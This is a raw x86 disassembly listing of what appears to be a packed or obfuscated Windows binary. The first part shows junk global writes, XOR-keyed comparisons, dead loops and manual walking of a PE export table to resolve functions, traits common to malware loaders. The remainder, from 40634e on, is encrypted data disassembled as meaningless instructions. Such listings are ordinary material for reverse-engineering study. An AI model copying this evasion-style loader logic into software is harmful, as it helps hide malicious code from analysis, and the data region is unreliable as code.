  405fe4:	mov    DWORD PTR ds:0x429008,ecx
  405fea:	add    esi,eax
  405fec:	mov    ecx,DWORD PTR [ebp-0x24]
  405fef:	sub    ecx,eax
  405ff1:	lea    edx,[esi-0x3272db]
  405ff7:	xor    DWORD PTR ds:0x428008,0x428000
  406001:	xor    ecx,ebx
  406003:	sub    DWORD PTR ds:0x42c01c,0x42b01c
  40600d:	xor    edx,ebx
  40600f:	cmp    edx,ecx
  406011:	mov    DWORD PTR ds:0x428000,0x76f
  40601b:	je     0x4062a3
  406021:	xor    DWORD PTR ds:0x42c010,edx
  406027:	mov    ecx,DWORD PTR [ebp-0x4]
  40602a:	xor    ecx,ebx
  40602c:	or     DWORD PTR ds:0x429014,0x42a01c
  406036:	add    ecx,eax
  406038:	cmp    esi,ecx
  40603a:	mov    DWORD PTR ds:0x42a01c,0x739d
  406044:	jne    0x406280
  40604a:	add    DWORD PTR ds:0x42a00c,0x429004
  406054:	push   DWORD PTR [ebp+0x8]
  406057:	call   0x413c14
  40605c:	mov    DWORD PTR [ebp-0x18],eax
  40605f:	mov    eax,DWORD PTR [ebp-0x4]
  406062:	mov    DWORD PTR ds:0x42c00c,0x1d
  40606c:	cmp    DWORD PTR ds:0x42c00c,0x0
  406073:	je     0x4060a7
  406079:	cmp    DWORD PTR ds:0x42c00c,0x21
  406080:	jne    0x40608f
  406086:	push   DWORD PTR [ebp-0xc]
  406089:	call   DWORD PTR ds:0x42401c
  40608f:	mov    edi,DWORD PTR ds:0x42c00c
  406095:	dec    edi
  406096:	mov    DWORD PTR ds:0x42c00c,edi
  40609c:	jmp    0x40606c
  4060a1:	adc    ecx,DWORD PTR ds:0x428008
  4060a7:	mov    ecx,DWORD PTR [ebp-0x18]
  4060aa:	and    DWORD PTR ds:0x42b01c,0x0
  4060b4:	mov    edi,DWORD PTR ds:0x42b01c
  4060ba:	inc    edi
  4060bb:	mov    DWORD PTR ds:0x42b01c,edi
  4060c1:	cmp    DWORD PTR ds:0x42b01c,0x23
  4060c8:	jne    0x4060da
  4060ce:	push   DWORD PTR [ebp-0x14]
  4060d1:	push   DWORD PTR [ebp-0x28]
  4060d4:	call   DWORD PTR ds:0x424020
  4060da:	cmp    DWORD PTR ds:0x42b01c,0x19
  4060e1:	jb     0x4060b4
  4060e7:	xor    eax,ebx
  4060e9:	add    DWORD PTR ds:0x429018,0x397c
  4060f3:	mov    edi,0x3272db
  4060f8:	sub    DWORD PTR ds:0x428020,0x386b
  406102:	add    eax,edi
  406104:	mov    DWORD PTR ds:0x42900c,0x67dc
  40610e:	cmp    ecx,eax
  406110:	mov    DWORD PTR ds:0x42c00c,0x661b
  40611a:	je     0x406313
  406120:	push   DWORD PTR [ebp-0x18]
  406123:	sub    DWORD PTR ds:0x42800c,0x42a014
  40612d:	push   DWORD PTR [ebp+0x8]
  406130:	and    DWORD PTR ds:0x42b000,0x429010
  40613a:	call   0x41b72b
  40613f:	sub    ecx,DWORD PTR ds:0x42a00c
  406145:	mov    DWORD PTR [ebp-0x18],eax
  406148:	xor    eax,eax
  40614a:	xor    eax,DWORD PTR ds:0x42a01c
  406150:	xor    DWORD PTR ds:0x428018,eax
  406156:	mov    eax,DWORD PTR [ebp-0x4]
  406159:	mov    ecx,DWORD PTR [ebp-0x18]
  40615c:	xor    eax,ebx
  40615e:	add    eax,edi
  406160:	cmp    ecx,eax
  406162:	je     0x406313
  406168:	mov    ecx,DWORD PTR ds:0x429010
  40616e:	add    DWORD PTR ds:0x42a010,ecx
  406174:	mov    eax,DWORD PTR [ebp-0x18]
  406177:	and    DWORD PTR ds:0x42a008,0x0
  406181:	jmp    0x406193
  406186:	mov    ecx,DWORD PTR ds:0x42a008
  40618c:	inc    ecx
  40618d:	mov    DWORD PTR ds:0x42a008,ecx
  406193:	cmp    DWORD PTR ds:0x42a008,0x14
  40619a:	jae    0x40621e
  4061a0:	cmp    DWORD PTR ds:0x42a008,0x1f
  4061a7:	jne    0x4061d5
  4061ad:	push   0x42b010
  4061b2:	push   DWORD PTR [ebp-0x10]
  4061b5:	push   0x4f72
  4061ba:	push   0x42900c
  4061bf:	push   DWORD PTR [ebp-0x24]
  4061c2:	push   0x4239e2
  4061c7:	push   DWORD PTR [ebp-0x1c]
  4061ca:	push   0x3544
  4061cf:	call   DWORD PTR ds:0x424024
  4061d5:	jmp    0x406186
  4061da:	and    DWORD PTR ds:0x428020,0x0
  4061e4:	mov    ecx,DWORD PTR ds:0x428020
  4061ea:	inc    ecx
  4061eb:	mov    DWORD PTR ds:0x428020,ecx
  4061f1:	cmp    DWORD PTR ds:0x428020,0x1a
  4061f8:	jne    0x406211
  4061fe:	push   DWORD PTR [ebp-0x1c]
  406201:	push   0x561b
  406206:	push   0x3276
  40620b:	call   DWORD PTR ds:0x424028
  406211:	cmp    DWORD PTR ds:0x428020,0x17
  406218:	jb     0x4061e4
  40621e:	mov    eax,DWORD PTR [eax+0x18]
  406221:	mov    DWORD PTR [ebp-0x24],eax
  406224:	xor    eax,eax
  406226:	mov    eax,DWORD PTR [ebp-0x18]
  406229:	mov    ecx,DWORD PTR [ebp+0x8]
  40622c:	add    DWORD PTR ds:0x42901c,0x480
  406236:	add    ecx,DWORD PTR [eax+0x20]
  406239:	mov    DWORD PTR [ebp-0x2c],ecx
  40623c:	sub    DWORD PTR ds:0x42c00c,ebx
  406242:	mov    eax,DWORD PTR [ebp-0x18]
  406245:	mov    ecx,DWORD PTR [ebp+0x8]
  406248:	add    DWORD PTR ds:0x42a004,0x42a01c
  406252:	add    ecx,DWORD PTR [eax+0x24]
  406255:	mov    DWORD PTR [ebp-0x34],ecx
  406258:	inc    ecx
  406259:	mov    eax,DWORD PTR [ebp-0x18]
  40625c:	sub    DWORD PTR ds:0x42b010,0x20b8
  406266:	mov    ecx,DWORD PTR [ebp+0x8]
  406269:	or     DWORD PTR ds:0x42a010,0x1874
  406273:	add    ecx,DWORD PTR [eax+0x1c]
  406276:	mov    eax,edi
  406278:	mov    DWORD PTR [ebp-0x18],ecx
  40627b:	jmp    0x4062db
  406280:	mov    ecx,DWORD PTR [ebp-0x2c]
  406283:	mov    edx,DWORD PTR [ebp+0x8]
  406286:	add    edx,DWORD PTR [ecx+esi*4]
  406289:	mov    DWORD PTR [ebp-0x28],edx
  40628c:	mov    ecx,DWORD PTR [ebp-0x4]
  40628f:	mov    edx,DWORD PTR [ebp-0x28]
  406292:	xor    ecx,ebx
  406294:	add    ecx,eax
  406296:	cmp    edx,ecx
  406298:	je     0x4062db
  40629e:	jmp    0x4062c7
  4062a3:	mov    ecx,DWORD PTR [ebp-0x4]
  4062a6:	mov    edx,DWORD PTR [ebp-0x8]
  4062a9:	xor    ecx,ebx
  4062ab:	add    ecx,eax
  4062ad:	cmp    edx,ecx
  4062af:	je     0x40631f
  4062b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4062b8:	mov    edx,DWORD PTR [ebp-0x30]
  4062bb:	xor    ecx,ebx
  4062bd:	add    ecx,eax
  4062bf:	cmp    edx,ecx
  4062c1:	je     0x40632e
  4062c7:	lea    eax,[ebp-0x8]
  4062ca:	push   eax
  4062cb:	push   DWORD PTR [ebp-0x28]
  4062ce:	push   DWORD PTR [ebp+0xc]
  4062d1:	call   0x41c3b5
  4062d6:	mov    eax,0x3272db
  4062db:	mov    ecx,DWORD PTR [ebp-0x4]
  4062de:	mov    edx,DWORD PTR [ebp-0x8]
  4062e1:	xor    ecx,ebx
  4062e3:	add    ecx,eax
  4062e5:	cmp    edx,ecx
  4062e7:	je     0x406302
  4062ed:	mov    ecx,DWORD PTR [ebp-0x34]
  4062f0:	movzx  ecx,WORD PTR [ecx+esi*2]
  4062f4:	mov    edx,DWORD PTR [ebp-0x18]
  4062f7:	mov    ecx,DWORD PTR [edx+ecx*4]
  4062fa:	mov    DWORD PTR [ebp-0x38],ecx
  4062fd:	jmp    0x4062a3
  406302:	mov    ecx,DWORD PTR [ebp-0x14]
  406305:	xor    ecx,ebx
  406307:	lea    esi,[esi+ecx*1+0x3272db]
  40630e:	jmp    0x405fec
  406313:	mov    eax,DWORD PTR [ebp-0x4]
  406316:	xor    eax,ebx
  406318:	add    eax,edi
  40631a:	jmp    0x40cf3f
  40631f:	mov    eax,DWORD PTR [ebp-0x4]
  406322:	xor    eax,ebx
  406324:	add    eax,0x3272db
  406329:	jmp    0x40cf3f
  40632e:	mov    ecx,DWORD PTR [ebp-0x38]
  406331:	add    ecx,DWORD PTR [ebp+0x8]
  406334:	mov    DWORD PTR [ebp-0x10],ecx
  406337:	mov    ecx,DWORD PTR [ebp-0x1c]
  40633a:	test   ecx,ecx
  40633c:	je     0x40ceca
  406342:	mov    DWORD PTR [ebp-0x20],0x0
  406349:	jmp    0x4086d8
  40634e:	ins    BYTE PTR es:[edi],dx
  40634f:	pop    ebp
  406350:	(bad)  
  406351:	call   0xd5a4cae1
  406356:	xchg   esi,eax
  406357:	imul   esi,edx,0x66
  40635a:	idiv   DWORD PTR [ecx]
  40635c:	stos   DWORD PTR es:[edi],eax
  40635d:	push   edi
  40635e:	cmp    BYTE PTR [ebx],bh
  406360:	bound  esp,QWORD PTR [edx+0x10]
  406363:	pop    edi
  406364:	bound  esp,QWORD PTR [edx-0x3c]
  406367:	push   esp
  406368:	mov    ds:0xeec964f9,eax
  40636d:	retf   
  40636e:	or     dh,BYTE PTR [ebx+edi*4-0x6f261e62]
  406375:	mov    al,ds:0x802adcdd
  40637a:	stos   BYTE PTR es:[edi],al
  40637b:	clc    
  40637c:	inc    eax
  40637d:	dec    ebx
  40637e:	pushf  
  40637f:	xchg   edx,eax
  406380:	aas    
  406381:	mov    dh,0xdf
  406383:	aam    0x96
  406385:	jbe    0x406394
  406387:	mov    edx,0x66568b88
  40638c:	aad    0xc1
  40638e:	xchg   esp,eax
  40638f:	call   0x77bf:0xc0bc8f1b
  406396:	jbe    0x4063fe
  406398:	xchg   ecx,eax
  406399:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40639a:	(bad)  
  40639b:	call   0xab671c47
  4063a0:	xchg   esp,eax
  4063a1:	retf   0x4cb7
  4063a4:	mov    ah,0x3
  4063a6:	fsubr  DWORD PTR [edx+0x390866fd]
  4063ac:	popf   
  4063ad:	push   0xffffff8f
  4063af:	pop    edx
  4063b0:	repnz aam 0xff
  4063b3:	addr16 int3 
  4063b5:	ror    DWORD PTR [edx+0x51],cl
  4063b8:	add    eax,0xd07b94bf
  4063bd:	mov    ah,0x9c
  4063bf:	test   DWORD PTR ds:0x193e65c0,esp
  4063c5:	imul   edx,DWORD PTR [edx+0x745f2881],0xffffff87
  4063cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063cd:	bt     DWORD PTR [ecx],edi
  4063d0:	das    
  4063d1:	mov    WORD PTR [ecx+edx*4+0x3c],fs
  4063d5:	fadd   QWORD PTR [ecx+0x5b3b0c7b]
  4063db:	or     ch,BYTE PTR [ebx-0x46]
  4063de:	cmp    bh,BYTE PTR [ecx]
  4063e0:	xor    esp,DWORD PTR [edx+0x2293364a]
  4063e6:	fcmovbe st,st(0)
  4063e8:	inc    eax
  4063e9:	sahf   
  4063ea:	(bad)  
  4063eb:	shr    DWORD PTR [edi-0xd],1
  4063ee:	jns    0x40637b
  4063f0:	xchg   BYTE PTR ds:0xeb4bb583,ah
  4063f6:	sbb    DWORD PTR [edi+0x7],edx
  4063f9:	rcr    BYTE PTR [ebx-0x39],cl
  4063fc:	adc    eax,0x5991598d
  406401:	(bad)  
  406402:	mov    ebp,0xa4a62a3a
  406407:	mov    eax,ds:0x5ea3f3f2
  40640c:	adc    al,0x3e
  40640e:	(bad)  
  40640f:	inc    DWORD PTR [ebx+0x7ac018e2]
  406415:	pop    ebx
  406416:	ins    BYTE PTR es:[edi],dx
  406417:	cmp    eax,0x9996677f
  40641c:	mov    ah,0xdd
  40641e:	mov    bh,0x8
  406420:	cmp    eax,0xc3ff1fd4
  406425:	cmp    eax,0x6a0be52
  40642a:	cmp    al,0x94
  40642c:	iret   
  40642d:	and    al,0x6c
  40642f:	cmc    
  406430:	test   BYTE PTR [edx+0x4e3a3249],al
  406436:	nop
  406437:	dec    eax
  406438:	aaa    
  406439:	aaa    
  40643a:	fisttp QWORD PTR [eax+0x65]
  40643d:	mov    edi,0xf0123ec4
  406442:	mov    dl,0xc9
  406444:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406445:	stos   BYTE PTR es:[edi],al
  406446:	pop    edx
  406447:	pop    ds
  406448:	mov    eax,ds:0xd8f435d0
  40644d:	js     0x4064b1
  40644f:	mov    ebx,0x15cb6cca
  406454:	sub    ah,dl
  406456:	or     al,0x6b
  406458:	sbb    BYTE PTR [edi],dl
  40645a:	xchg   ebp,eax
  40645b:	add    dh,BYTE PTR [esi]
  40645d:	jne    0x4063e5
  40645f:	ins    DWORD PTR es:[edi],dx
  406460:	mov    ecx,0xca7630b
  406465:	mov    eax,0x8c55f864
  40646a:	sub    DWORD PTR [ecx+0x440637bd],0x43
  406471:	xchg   ecx,eax
  406472:	dec    eax
  406473:	mov    bl,0x8e
  406475:	(bad)  
  406476:	fsubr  DWORD PTR [edi]
  406478:	sub    al,0x17
  40647a:	or     al,0x18
  40647c:	retf   
  40647d:	mov    ax,ds:0x70fa0361
  406483:	mov    esp,0x1f65e77f
  406488:	mov    ds:0xf8c1f89,al
  40648d:	in     al,0x6b
  40648f:	inc    esp
  406490:	cmp    BYTE PTR [esi+esi*2],cl
  406493:	jle    0x40646f
  406495:	cs stos DWORD PTR es:[edi],eax
  406497:	rcl    DWORD PTR [ebx+0x6e],0xfb
  40649b:	in     eax,0xe0
  40649d:	addr16 (bad) 
  40649f:	cmp    esi,ecx
  4064a1:	imul   esi,esi,0x63
  4064a4:	push   ss
  4064a5:	cs sbb eax,0xc431ad3b
  4064ab:	or     dl,BYTE PTR [eax]
  4064ad:	mov    ebp,DWORD PTR [ebx]
  4064af:	data16 sbb BYTE PTR [edx+0x335eb87b],dh
  4064b6:	xchg   edx,eax
  4064b7:	ret    0x3705
  4064ba:	xor    BYTE PTR [ecx],0xf5
  4064bd:	jp     0x40649d
  4064bf:	ins    BYTE PTR es:[edi],dx
  4064c0:	mov    dl,0x3c
  4064c2:	mov    esi,0x7e083303
  4064c7:	js     0x406538
  4064c9:	leave  
  4064ca:	mov    DWORD PTR [edi+0x7450984f],ecx
  4064d0:	or     edi,ebp
  4064d2:	mov    edx,0x83e4fb4
  4064d7:	cmp    BYTE PTR [esi+0x5c159953],0xab
  4064de:	xor    BYTE PTR [edx+0x58],cl
  4064e1:	(bad)  
  4064e2:	(bad)  
  4064e3:	mov    edx,0x28cffce5
  4064e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064e9:	push   ds
  4064ea:	mov    eax,0x72db051f
  4064ef:	xchg   esi,eax
  4064f0:	cdq    
  4064f1:	pop    es
  4064f2:	scas   eax,DWORD PTR es:[edi]
  4064f3:	mov    esi,DWORD PTR [edx-0x18a8364b]
  4064f9:	pop    ebp
  4064fa:	xor    esp,esi
  4064fc:	out    0xa8,al
  4064fe:	sub    DWORD PTR [ebx-0x7c0f89e5],0x4
  406505:	xor    al,BYTE PTR [ebx+esi*2+0xa6929ff]
  40650c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40650d:	push   ss
  40650e:	in     eax,dx
  40650f:	into   
  406510:	neg    DWORD PTR [esi]
  406512:	cmp    ah,cl
  406514:	shl    DWORD PTR [edx],0xff
  406517:	sahf   
  406518:	adc    al,BYTE PTR [esi+0xe81c583]
  40651e:	jmp    0xea36:0xa985531e
  406525:	jns    0x4064c3
  406527:	inc    ebp
  406528:	cmp    cl,ah
  40652a:	fdiv   QWORD PTR [ebp+0x1a7c55cc]
  406530:	mov    ecx,0x265563fb
  406535:	mov    dl,BYTE PTR [ebx+edi*1-0x7e]
  406539:	push   eax
  40653a:	jb     0x4065bb
  40653c:	mov    ds:0x7cccce93,eax
  406541:	xchg   edi,eax
  406542:	loop   0x406529
  406544:	pop    ecx
  406545:	jge    0x406553
  406547:	jle    0x4065be
  406549:	in     eax,dx
  40654a:	js     0x4064d2
  40654c:	xchg   ebp,eax
  40654d:	rol    BYTE PTR [edi],0x12
  406550:	add    eax,DWORD PTR [edi+edi*2+0x7e]
  406554:	xchg   ecx,eax
  406555:	idiv   ah
  406557:	push   edx
  406558:	stos   DWORD PTR es:[edi],eax
  406559:	loope  0x406568
  40655b:	mov    bl,0x49
  40655d:	out    0x7,al
  40655f:	mov    cl,BYTE PTR [ebp+0x5c380f08]
  406565:	mov    esp,0x7995afa4
  40656a:	out    0xf5,al
  40656c:	gs add al,0xa
  40656f:	add    eax,0xc597cb6d
  406574:	lock sbb BYTE PTR [edx+0x48df4c25],0x5
  40657c:	cmp    ch,dl
  40657e:	int3   
  40657f:	mov    WORD PTR [edx],ss
  406581:	mov    bl,BYTE PTR [edi-0x6a11bfda]
  406587:	dec    esi
  406588:	and    esi,0x308a7a2c
  40658e:	push   ss
  40658f:	shl    BYTE PTR [ecx],1
  406591:	add    BYTE PTR [ebx+0x2e42d27b],bh
  406597:	mov    bh,0x9
  406599:	cmp    ecx,DWORD PTR [edi+ebx*2]
  40659c:	int3   
  40659d:	imul   esi,DWORD PTR [eax+0x35],0x1
  4065a1:	xchg   ebp,ebp
  4065a3:	das    
  4065a4:	adc    BYTE PTR [edx],0xef
  4065a7:	or     al,0xdd
  4065a9:	rcr    DWORD PTR [ebp+0x37e326c3],cl
  4065af:	sti    
  4065b0:	mov    BYTE PTR [eax-0x1640e02],bl
  4065b6:	sbb    eax,0xe6992fa
  4065bb:	jb     0x4065bf
  4065bd:	push   ebp
  4065be:	mov    dl,0xbd
  4065c0:	popf   
  4065c1:	in     al,0xbf
  4065c3:	pop    ss
  4065c4:	hlt    
  4065c5:	into   
  4065c6:	ja     0x40663c
  4065c8:	jg     0x40662a
  4065ca:	jnp    0x4065c4
  4065cc:	jmp    0x84046826
  4065d1:	push   edx
  4065d2:	data16 xor dl,BYTE PTR [edi]
  4065d5:	inc    edi
  4065d6:	pusha  
  4065d7:	xor    edi,0xffffff81
  4065da:	mov    dl,0xdb
  4065dc:	repz fs push ecx
  4065df:	cwde   
  4065e0:	das    
  4065e1:	xor    eax,0x719334de
  4065e6:	cmc    
  4065e7:	imul   ecx,DWORD PTR [esi-0x35],0x85c14513
  4065ee:	dec    edx
  4065ef:	aas    
  4065f0:	ja     0x4065cc
  4065f2:	fwait
  4065f3:	imul   esi,DWORD PTR [eax+0x27],0xa5cc48
  4065fa:	xchg   esp,eax
  4065fb:	sub    bl,BYTE PTR [ebp-0x32705f98]
  406601:	cmp    bh,BYTE PTR [esi+0x2a03b00f]
  406607:	inc    eax
  406608:	sbb    DWORD PTR fs:[ebp-0x5a5b530e],ecx
  40660f:	stos   BYTE PTR es:[edi],al
  406610:	mov    edi,0x56c571d2
  406615:	mov    eax,ds:0xcb52304d
  40661a:	mov    WORD PTR [eax+0x7566cc2f],ds
  406620:	jg     0x406693
  406622:	nop
  406623:	nop
  406624:	jmp    0x406654
  406626:	adc    BYTE PTR [edi],bh
  406628:	and    DWORD PTR [ebx-0x3f],ecx
  40662b:	cmp    al,0x9e
  40662d:	daa    
  40662e:	lahf   
  40662f:	cdq    
  406630:	jle    0x406617
  406632:	jno    0x4066ae
  406634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406635:	mov    ds:0x217294c2,al
  40663a:	xchg   ecx,eax
  40663b:	inc    eax
  40663c:	push   eax
  40663d:	xchg   DWORD PTR [eax+edx*2],ebp
  406640:	scas   al,BYTE PTR es:[edi]
  406641:	jno    0x406680
  406643:	pushf  
  406644:	mov    cl,0xf
  406646:	push   esi
  406647:	xchg   ecx,eax
  406648:	aaa    
  406649:	sub    BYTE PTR [eax+0x3a],bl
  40664c:	and    BYTE PTR [ecx+0x1d],0x4e
  406650:	mov    bl,0xf8
  406652:	jmp    0x3616cf6d
  406657:	or     BYTE PTR [ecx+0x11],dh
  40665a:	add    al,0x3
  40665c:	pop    ds
  40665d:	inc    ebx
  40665e:	cmp    BYTE PTR [esi],dl
  406660:	mov    ebx,0xf6837c24
  406665:	imul   esp,DWORD PTR [ebp-0x21],0xed818332
  40666c:	xor    ebp,ebp
  40666e:	outs   dx,DWORD PTR ds:[esi]
  40666f:	std    
  406670:	mov    BYTE PTR [esi],ch
  406672:	std    
  406673:	cdq    
  406674:	dec    ebx
  406675:	add    DWORD PTR [ebx-0x7ad72542],0x6878755a
  40667f:	inc    ecx
  406680:	or     DWORD PTR [eax],eax
  406682:	mov    ?,WORD PTR [edi-0x27]
  406685:	mov    esi,DWORD PTR [ecx]
  406687:	mov    eax,0x1efd3147
  40668c:	adc    DWORD PTR [esp+edi*2],ebp
  40668f:	aam    0x69
  406691:	mov    dl,0xb4
  406693:	pop    edx
  406694:	out    dx,al
  406695:	pop    esi
  406696:	pop    ss
  406697:	dec    esi
  406698:	ret    
  406699:	inc    ecx
  40669a:	cdq    
  40669b:	test   eax,0xfc0349e4
  4066a0:	mov    eax,0x1c89360c
  4066a5:	sahf   
  4066a6:	mov    ecx,0xc9472249
  4066ab:	dec    edi
  4066ac:	std    
  4066ad:	in     al,0xd9
  4066af:	mov    ss,WORD PTR [ebx+esi*1]
  4066b2:	cmp    al,0xd9
  4066b4:	mov    es,WORD PTR [eax+0x78]
  4066b7:	ficomp WORD PTR [edx]
  4066b9:	js     0x40672d
  4066bb:	in     eax,0x1d
  4066bd:	in     eax,dx
  4066be:	add    al,BYTE PTR [eax-0x6e]
  4066c1:	mov    ebx,DWORD PTR [ecx+edx*8-0x54fe5594]
  4066c8:	mov    eax,0x547cf45d
  4066cd:	in     al,dx
  4066ce:	push   ss
  4066cf:	ins    BYTE PTR es:[edi],dx
  4066d0:	pushf  
  4066d1:	pop    eax
  4066d2:	pop    ebx
  4066d3:	imul   ebx,DWORD PTR [edi-0x3b978965],0x76203332
  4066dd:	push   ebp
  4066de:	pop    edx
  4066df:	pop    esp
  4066e0:	ror    BYTE PTR [ecx],0x4e
  4066e3:	sub    DWORD PTR cs:[ecx+0x20],ebp
  4066e7:	popf   
  4066e8:	mov    bh,0x6c
  4066ea:	pop    ds
  4066eb:	dec    ebp
  4066ec:	and    cl,BYTE PTR [esi-0xe]
  4066ef:	sbb    eax,esi
  4066f1:	add    BYTE PTR [ebx-0x76],bl
  4066f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066f5:	adc    dh,BYTE PTR [ebp+0x7d]
  4066f8:	mov    ebx,0x8a2eccdd
  4066fd:	cwde   
  4066fe:	xlat   BYTE PTR ds:[ebx]
  4066ff:	data16 sub bl,BYTE PTR [edi+0x2]
  406703:	and    dl,dh
  406705:	jmp    0x73b9ee6c
  40670a:	mov    bl,al
  40670c:	test   BYTE PTR [eax+0x73],al
  40670f:	inc    eax
  406710:	(bad)  [ecx]
  406712:	inc    ebp
  406713:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406714:	push   ebp
  406715:	mov    WORD PTR [eax+esi*8],cs
  406718:	cld    
  406719:	mov    edx,0x44f7045f
  40671e:	jne    0x4066bd
  406720:	repz inc ecx
  406722:	shr    BYTE PTR [ecx*4+0x7a038e5b],cl
  406729:	xchg   ebx,ebx
  40672b:	outs   dx,BYTE PTR ds:[esi]
  40672c:	fdivr  QWORD PTR [ebx]
  40672e:	stos   BYTE PTR es:[edi],al
  40672f:	out    0x5f,al
  406731:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406732:	mov    eax,0xf7537c4b
  406737:	pop    esp
  406738:	pop    esp
  406739:	mov    dh,0xcb
  40673b:	cmp    cl,BYTE PTR [edx+0x3d458ca3]
  406741:	ins    BYTE PTR es:[edi],dx
  406742:	mov    ds:0x8f6ae7dc,al
  406747:	cmp    eax,0x39989b24
  40674c:	and    edx,esi
  40674e:	adc    BYTE PTR [esi-0x750bb79c],0x9c
  406755:	cdq    
  406756:	cli    
  406757:	xor    DWORD PTR [esi+esi*8+0x2e1acb37],edi
  40675e:	xchg   edi,eax
  40675f:	iret   
  406760:	es pop ebp
  406762:	cmp    eax,0x24bfd89c
  406767:	dec    ecx
  406768:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406769:	inc    esp
  40676a:	clc    
  40676b:	jns    0x406777
  40676d:	lea    ebp,[edi]
  40676f:	push   edi
  406770:	int3   
  406771:	pop    esi
  406772:	aaa    
  406773:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  406775:	rol    edx,0xa7
  406778:	and    al,0xa7
  40677a:	sub    edi,edx
  40677c:	xchg   edi,eax
  40677d:	dec    esp
  40677e:	scas   eax,DWORD PTR es:[edi]
  40677f:	sbb    eax,0xe43d6a31
  406784:	cmp    ebx,ebx
  406786:	or     DWORD PTR [ebx],eax
  406788:	ins    DWORD PTR es:[edi],dx
  406789:	jp     0x406761
  40678b:	fnstenv ds:0x7c975ad9
  406791:	sahf   
  406792:	or     ebx,DWORD PTR ds:0xac3814ad
  406798:	addr16 (bad) 
  40679a:	and    BYTE PTR [esi+0x41],bl
  40679d:	fldenv [edi]
  40679f:	call   0x67cc:0x91934f12
  4067a6:	fsub   DWORD PTR [eax+eiz*1-0x3f]
  4067aa:	lods   al,BYTE PTR ds:[esi]
  4067ab:	hlt    
  4067ac:	stos   DWORD PTR es:[edi],eax
  4067ad:	pop    es
  4067ae:	pop    ecx
  4067af:	xchg   ecx,eax
  4067b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067b1:	fcom   DWORD PTR [ecx-0x4a]
  4067b4:	cli    
  4067b5:	sub    bh,BYTE PTR [ecx+0x34]
  4067b8:	hlt    
  4067b9:	(bad)  
  4067ba:	adc    BYTE PTR [ebx+0x33877e43],bl
  4067c0:	mov    WORD PTR [eax+0x6b5dd15a],gs
  4067c6:	lea    ebx,[esi+0x26]
  4067c9:	jmp    0x83d329a4
  4067ce:	loopne 0x40683c
  4067d0:	es sbb eax,0xe22dc42f
  4067d6:	cmp    eax,0x5dbf570a
  4067db:	in     al,dx
  4067dc:	test   DWORD PTR [esi-0x91d0709],edx
  4067e2:	mov    eax,ds:0x61655d7a
  4067e7:	lock jb 0x4067d2
  4067ea:	pop    edi
  4067eb:	div    DWORD PTR [ebp+0x6b]
  4067ee:	lock ins BYTE PTR es:[edi],dx
  4067f0:	outs   dx,DWORD PTR ds:[esi]
  4067f1:	pusha  
  4067f2:	and    DWORD PTR [esi-0x41989d0d],esp
  4067f8:	mov    ebp,0xe890bffd
  4067fd:	jmp    0xac69cd7a
  406802:	aas    
  406803:	pop    edi
  406804:	add    edi,DWORD PTR [ebp+0x29]
  406807:	mov    cl,0xdf
  406809:	mov    WORD PTR [eax],ss
  40680b:	jb     0x40685e
  40680d:	nop
  40680e:	push   cs
  40680f:	pop    edx
  406810:	inc    esp
  406811:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406812:	adc    ch,bh
  406814:	xchg   esp,eax
  406815:	pop    ss
  406816:	sahf   
  406817:	add    al,0x33
  406819:	mov    dh,0x13
  40681b:	clc    
  40681c:	push   0x5016755e
  406821:	adc    bl,BYTE PTR [esi]
  406823:	lock xchg DWORD PTR [esi],ecx
  406826:	add    bh,BYTE PTR [ebx+0x70]
  406829:	push   esi
  40682a:	outs   dx,BYTE PTR ds:[esi]
  40682b:	call   0x6eda4b41
  406830:	sub    eax,0x6c5a2a9e
  406835:	jnp    0x4067d6
  406837:	retf   
  406838:	(bad)  
  40683a:	cld    
  40683b:	dec    edx
  40683c:	pop    ss
  40683d:	jl     0x40687a
  40683f:	loopne 0x40680c
  406841:	sbb    BYTE PTR [esi+0x5],bh
  406844:	mov    BYTE PTR [eax],dh
  406846:	and    eax,DWORD PTR [ecx+0x66753f8c]
  40684c:	das    
  40684d:	pop    ebx
  40684e:	and    DWORD PTR [edi-0x2feec24b],0xffffffd0
  406855:	retf   0xc893
  406858:	aaa    
  406859:	imul   edi,edx,0x1
  40685c:	inc    ecx
  40685d:	jnp    0x4068a0
  40685f:	fsub   DWORD PTR [esp+ebp*8]
  406862:	push   ebp
  406863:	and    edi,DWORD PTR [edx-0x4673f213]
  406869:	retf   
  40686a:	jg     0x406830
  40686c:	imul   ecx,DWORD PTR ds:[edx-0x798be561],0x50
  406874:	into   
  406875:	xchg   ebp,eax
  406876:	clc    
  406877:	test   BYTE PTR [ebp+0x76a6f65],dl
  40687d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40687e:	nop
  40687f:	retf   
  406880:	enter  0xd396,0x9b
  406884:	(bad)  
  406886:	inc    ebp
  406887:	mov    dl,0xa3
  406889:	xor    al,0x2d
  40688b:	pop    ds
  40688c:	(bad)  
  40688d:	mov    ds:0x65cafa92,eax
  406892:	add    al,0xa4
  406894:	outs   dx,DWORD PTR ds:[esi]
  406895:	dec    esp
  406896:	fsubr  DWORD PTR [eax-0x338ee2]
  40689d:	fadd   QWORD PTR [edi+0x36]
  4068a0:	mov    bh,0x33
  4068a2:	cmp    DWORD PTR [edx],ebp
  4068a4:	icebp  
  4068a5:	push   esp
  4068a6:	or     eax,0xf42537dd
  4068ab:	dec    edx
  4068ac:	(bad)  
  4068ad:	sbb    eax,0xdd24ad7a
  4068b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068b3:	(bad)  [ebp+0x5]
  4068b6:	xor    BYTE PTR [esi+ebx*4],bh
  4068b9:	push   eax
  4068ba:	xchg   dh,cl
  4068bc:	and    al,0x66
  4068be:	dec    edx
  4068bf:	and    al,0x5d
  4068c1:	bound  ebp,QWORD PTR [edi-0x4f]
  4068c4:	popf   
